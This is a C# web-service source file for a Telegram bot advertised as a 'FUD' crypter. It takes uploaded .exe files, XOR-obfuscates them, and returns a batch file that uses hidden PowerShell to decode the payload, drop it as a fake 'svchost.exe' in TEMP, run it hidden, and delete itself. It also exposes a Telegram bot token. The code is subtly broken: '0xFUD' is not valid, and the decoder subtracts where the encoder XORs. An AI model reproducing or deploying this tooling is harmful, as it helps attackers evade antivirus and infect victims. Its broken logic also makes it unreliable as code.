using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/", () => "🟢 v8.0 ALIVE - FUD READY");

app.MapPost("/webhook", async (HttpContext ctx) =>
{
    string body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
    
    // SIMPLE REGEX - NO JSON
    var chatMatch = Regex.Match(body, @"""chat"":\s*\{\s*""id"":\s*(\d+)");
    var fileMatch = Regex.Match(body, @"""file_id"":\s*""([^""]+\.exe)""");
    
    if (chatMatch.Success && fileMatch.Success)
    {
        long chatId = long.Parse(chatMatch.Groups[1].Value);
        string fileId = fileMatch.Groups[1].Value;
        
        _ = Task.Run(async () => await Crypter(chatId, fileId));
    }
    
    ctx.Response.StatusCode = 200;
});

static async Task Crypter(long chatId, string fileId)
{
    using var http = new HttpClient();
    
    // Get file path (SIMPLE regex)
    string fileResp = await http.GetStringAsync($"https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id={fileId}");
    var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
    if (!pathMatch.Success) return;
    
    string filePath = pathMatch.Groups[1].Value;
    
    // Download EXE
    byte[] exe = await http.GetByteArrayAsync($"https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/{filePath}");
    
    // XOR ENCRYPT (NO AES DEPENDENCIES)
    byte[] encrypted = XorEncrypt(exe, 0xFUD);
    string b64 = Convert.ToBase64String(encrypted);
    
    // ULTRA-SIMPLE BAT
    string bat = $"@echo off\n" +
                 $"powershell -nop -w hidden -c \"$d=[Convert]::FromBase64String('{b64.Replace(\"'\",\"''\")}');for($i=0;$i<$d.length;$i++){$d[$i]=$d[$i]-0xFUD};[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'svchost.exe'),$d);Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden\"\n" +
                 $"del /f /q %%0";
    
    // Send FUD
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(Encoding.UTF8.GetBytes(bat)), "document", "fud-v8.0.exe");
    form.Add(new StringContent("🔥 FUD v8.0 - XOR Encrypted"), "caption");
    
    await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
}

static byte[] XorEncrypt(byte[] data, byte key)
{
    byte[] result = new byte[data.Length];
    for (int i = 0; i < data.Length; i++)
        result[i] = (byte)(data[i] ^ key);
    return result;
}

app.Run();
